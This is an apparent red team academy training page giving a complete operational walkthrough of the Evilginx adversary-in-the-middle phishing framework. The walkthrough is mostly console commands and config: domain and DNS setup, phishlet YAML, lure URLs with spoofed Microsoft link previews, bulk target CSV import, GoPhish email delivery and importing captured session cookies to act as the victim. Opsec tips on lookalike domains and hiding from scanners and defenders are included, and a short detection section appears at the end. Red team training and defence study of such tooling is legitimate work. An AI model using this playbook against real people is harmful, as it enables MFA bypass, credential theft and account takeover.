---
layout: training-page
title: "Evilginx AiTM Phishing Framework — Red Team Academy"
module: "C2 Frameworks"
tags:
  - phishing
  - aitm
  - mfa-bypass
  - initial-access
  - session-hijacking
  - evilginx
page_key: "c2-evilginx"
render_with_liquid: false
---

# Evilginx AiTM Phishing Framework

Evilginx is an adversary-in-the-middle (AiTM) phishing framework built in Go. Rather than hosting a fake login page, it acts as a transparent reverse proxy that sits between the victim and the real target website. The victim authenticates against the real site — Evilginx captures the session cookies in transit, bypassing multi-factor authentication entirely. It is the standard tool for AiTM phishing in red team engagements.

Evilginx operates two servers internally: an HTTP/HTTPS reverse proxy server and a DNS server. It requires a VPS with a public IP, a domain, and DNS control. The Pro version adds detection evasion, an official phishlet database, wildcard TLS, and Cloudflare/Route53 DNS automation. The community version is open-source and available on GitHub.

## How AiTM Works

Standard phishing steals credentials but fails against MFA. AiTM goes further:

1. Victim clicks phishing link → lands on Evilginx proxy (e.g., `login.microsoft.phishingdomain.com`)
2. Evilginx forwards every request to the real site (`login.microsoft.com`) and relays responses back
3. Victim completes full authentication including MFA — against the real Microsoft servers
4. Evilginx intercepts the post-auth session cookie from the response stream
5. Attacker imports cookie into browser — authenticated session, no credentials or MFA needed

This defeats TOTP, push notifications, SMS codes, and most hardware keys (FIDO2/passkeys are resistant).

## Prerequisites

- Linux VPS with a public IP (cloud VM recommended)
- A domain you control (register one specific to the engagement)
- Ports 80, 443, and 53 open inbound (DNS, HTTP, HTTPS)
- Go 1.18+ (community build) or a BREAKDEV RED license (Pro)
- DNS provider access (Cloudflare, Route53, or manual NS delegation)

## Installation (Community)

```
# Dependencies
apt update && apt install -y git make golang-go

# Clone and build
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# Binary lands in build/
ls build/evilginx
```

### Build Requirements

```
# Go 1.18+
go version

# Node.js 14.17.0+ (only needed for Evilpuppet feature)
node --version

# If managing multiple Node versions:
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
nvm install 14.17.0
```

### Running

```
# Run as root (required for port 53 binding)
sudo ./build/evilginx -p ./phishlets -t ./redirectors

# Flags:
#   -p   path to phishlets directory
#   -t   path to HTML redirector templates
#   -debug  enable debug output
#   -developer  disable certificate validation (local testing)
```

## First Run Configuration

Evilginx drops into an interactive console on startup. Configure it before enabling any phishlets:

### Set Your Domain and External IP

```
: config domain phishingdomain.com
: config ipv4 203.0.113.45

# Verify
: config
```

### Set Unauth Redirect

```
# Any request not matching a valid lure URL redirects here
# Use a real-looking URL to disguise your server
: config unauth_url https://www.google.com
```

## DNS Setup

Evilginx needs to be authoritative for your phishing domain (or at least a subdomain) to issue Let's Encrypt wildcard certificates via DNS-01 challenge.

### Option 1: Delegate the Domain to Evilginx's DNS Server

```
# At your registrar, set NS records for your domain to your VPS IP:
# ns1.phishingdomain.com   A    203.0.113.45
# phishingdomain.com       NS   ns1.phishingdomain.com

# Evilginx handles all DNS from there
```

### Option 2: Use Cloudflare DNS Provider (Pro / Recommended)

```
# In Evilginx Pro, add a DNS provider to automate record management:
: dns providers

# Add Cloudflare with your API token:
: dns add cloudflare phishingdomain.com <api_token>

# Evilginx will automatically create/delete DNS records for cert issuance
```

## Phishlets

Phishlets are YAML configuration files that tell Evilginx how to proxy a specific target website — which hostnames to spoof, which cookies to capture, which parameters to intercept, and how to detect successful authentication.

### Managing Phishlets

```
# List all loaded phishlets
: phishlets

# Show phishlet details
: phishlets get microsoft365

# Set hostname for a phishlet (subdomain must be under your configured domain)
: phishlets hostname microsoft365 login.microsoft365.phishingdomain.com

# Enable phishlet (triggers TLS cert issuance)
: phishlets enable microsoft365

# Disable phishlet
: phishlets disable microsoft365

# Hide phishlet (still active but returns 404 to scanners)
: phishlets hide microsoft365
```

### Phishlet File Structure (YAML)

```
name: 'example'
author: 'author'
version: '1.0.0'
min_ver: '3.0.0'
desc: 'Example target phishlet'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'example.com', session: true}

sub_filters:
  - {triggers_on: 'login.example.com', orig_sub: 'login', domain: 'example.com', search: 'href="https://', replace: 'href="https://', mimes: ['text/html']}

auth_tokens:
  - domain: '.example.com'
    keys: ['session_token', 'auth_cookie']

auth_urls:
  - url: 'https://login.example.com/complete'
    force_post: false

login:
  username: {key: 'username', search: ['username=(.*)', '&']}
  password: {key: 'password', search: ['password=(.*)', '&']}
```

### Community Phishlet Sources

```
# Phishlets are community-maintained and scattered across GitHub
# Search for targets you need:
# github.com/search?q=phishlet+microsoft365

# Common targets with community phishlets:
# - Microsoft 365 / Azure AD
# - Google Workspace
# - GitHub
# - LinkedIn
# - Okta
# - Duo

# Place .yaml files in your phishlets directory:
cp microsoft365.yaml ./phishlets/
# Restart or reload Evilginx to detect new phishlets
```

## Lures

Lures are the actual phishing URLs you send to targets. Create them after a phishlet is enabled and has a valid TLS certificate.

```
# Create a lure for a phishlet
: lures create microsoft365

# List all lures (shows ID, phishlet, URL)
: lures

# Get the full phishing URL for a lure
: lures get-url 0

# Customize the lure path (makes URL look more legitimate)
: lures edit 0 path /microsoft/login/sso/redirect

# Set redirect URL (where victim goes after successful auth)
: lures edit 0 redirect_url https://portal.office.com

# Set a redirect URL for lure (post-capture redirect)
: lures edit 0 redirect_url https://login.microsoftonline.com/common/oauth2/authorize

# Add OpenGraph metadata for link previews (Teams, Slack, SMS)
: lures edit 0 og_title "Microsoft 365 - Sign In"
: lures edit 0 og_description "Sign in to your Microsoft 365 account"
: lures edit 0 og_image https://logincdn.msftauth.net/16.000.29385.02/images/microsoft_logo.svg

# Set user-agent filter (only serve to real browsers, block scanners)
: lures edit 0 ua_filter "Mozilla.*Windows"

# Pause a lure temporarily
: lures edit 0 pause 2h30m

# Import bulk targets from CSV
: lures import 0 /root/targets.csv

# Delete a lure
: lures delete 0
```

### Bulk Lure Variables (CSV Import)

```
# CSV format for personalized phishing links
# Variables get encrypted into the URL GET parameter
email,name
alice@target.com,Alice Smith
bob@target.com,Bob Jones
carol@target.com,Carol White

# Import
: lures import 0 /root/targets.csv

# Evilginx generates unique URL per row with encrypted variable payload
# Each URL decrypts to reveal the target's email/name for personalizing the landing page
```

## Sessions

Sessions are captured when a victim successfully authenticates through your phishlet. Evilginx records credentials and session cookies.

```
# View all captured sessions
: sessions

# View session details (credentials + cookies in JSON)
: sessions 1

# Delete specific session(s)
: sessions delete 1
: sessions delete 1-5,8-10

# Delete all sessions
: sessions delete all
```

### Using Captured Sessions

```
# Session data includes cookies in JSON format like:
# [
#   {"name": "ESTSAUTH", "value": "...", "domain": ".microsoft.com", ...},
#   {"name": "ESTSAUTHPERSISTENT", "value": "...", "domain": ".login.microsoftonline.com", ...}
# ]

# To impersonate the session:
# 1. Open browser in a fresh profile (or Incognito)
# 2. Clear ALL existing cookies for the target domain
# 3. Install Cookie-Editor extension (Chrome or Firefox)
# 4. Import the JSON cookie array from the session
# 5. Navigate to the target site - you are now authenticated as the victim
```

## Blacklist

Evilginx automatically blacklists IPs that hit invalid URLs (scanners, bots, Blue Team). Blacklisted IPs get a 404 or redirect.

```
# View blacklist mode
: blacklist

# Set blacklist mode
: blacklist unauth    # (default) block unauthorized requests
: blacklist all       # block everything
: blacklist noadd     # block unauthorized but don't add to persistent list
: blacklist off       # allow previously blacklisted IPs through

# Toggle logging of blacklisted hits
: blacklist log on
: blacklist log off

# Blacklist file (add manual IPs/CIDRs)
# /root/.evilginx/blacklist.txt
# Format: one IP or CIDR per line
# 192.0.2.0/24
# 203.0.113.50
# Requires restart to reload manual edits
```

## GoPhish Integration

Evilginx 3.3+ supports a GoPhish integration that lets GoPhish handle email delivery while Evilginx handles the phishing proxy. This gives you GoPhish's campaign tracking and email automation with Evilginx's AiTM cookie theft.

```
# Use the modified GoPhish fork with Evilginx support:
# github.com/kgretzky/gophish

# In Evilginx, the lure URL is your campaign URL in GoPhish
# GoPhish appends ?rid={{.RId}} to the URL
# Evilginx strips the tracker parameter before proxying to the real site

# Workflow:
# 1. Create lure in Evilginx, note the phishing URL
# 2. Set that URL as the campaign URL in GoPhish
# 3. GoPhish sends emails with {{.URL}} — each target gets a unique tracked link
# 4. Victim clicks → GoPhish records click, Evilginx proxies auth, captures session
# 5. Check GoPhish for click tracking, Evilginx sessions for captured cookies
```

## TLS Certificate Issuance

```
# Evilginx automatically requests Let's Encrypt certs when a phishlet is enabled
# Uses ACME DNS-01 challenge (requires Evilginx to be authoritative for the domain)

# Check certificate status
: phishlets

# If certs fail to issue, verify:
# 1. Port 53 is open inbound
# 2. Your domain's NS records point to your VPS
# 3. DNS propagation is complete (check: dig NS phishingdomain.com)
# 4. Rate limits - LE limits 5 certs per domain per week

# Pro version uses wildcard certs (*.phishingdomain.com) issued via DNS-01
# This covers all subdomains with a single cert request
```

## Operational Security

- Register your phishing domain at least 2 weeks before the engagement — fresh domains trigger spam filters
- Use a domain that visually resembles the target (typosquat, combosquat, or lookalike Unicode characters)
- Use a dedicated VPS not shared with any other engagements — if the IP gets blocklisted, it affects only this engagement
- Set `unauth_url` to a benign site so your server doesn't return suspicious responses to scanners
- Enable the UA filter on lures to reject non-browser traffic (reduces scanner exposure)
- Avoid testing your own phishing link with a corporate browser — your company's proxy may report the URL
- FIDO2/WebAuthn passkeys are resistant to AiTM — if the target has these enabled, session cookie theft still occurs but may be limited in scope
- Log all sessions immediately after capture — sessions expire when victims log out or rotate tokens

## Common Issues

```
# Port 53 already in use (systemd-resolved)
systemctl stop systemd-resolved
systemctl disable systemd-resolved
# Then edit /etc/resolv.conf to use 8.8.8.8 for the server's own DNS

# Certificate not issuing
dig NS phishingdomain.com      # verify NS delegation
dig @203.0.113.45 phishingdomain.com   # test your DNS server directly
# Check rate limits at crt.sh for your domain

# Phishlet not loading
: phishlets                    # check status
: phishlets get microsoft365   # check hostname config
# Verify the hostname subdomain matches your configured domain
```

## Detection Signals (Blue Team Perspective)

- Impossible travel: authentication from one country immediately followed by access from another
- Token replay from a new IP/ASN after authentication
- Conditional Access policies that require compliant/domain-joined devices will block stolen sessions
- Microsoft Entra ID / Azure AD Sign-In logs show authentication from the Evilginx VPS IP
- DMARC enforcement rejects email from spoofed domains — check customer's DMARC policy before engagement
- Browser fingerprinting (screen size, timezone, fonts) can detect the session being used on a different machine

## Resources

- Evilginx (community) — `github.com/kgretzky/evilginx2`
- Evilginx Pro documentation — `help.evilginx.com`
- Evilginx Mastery course — `academy.breakdev.org`
- Breakdev blog — `breakdev.org`
- GoPhish fork for Evilginx integration — `github.com/kgretzky/gophish`
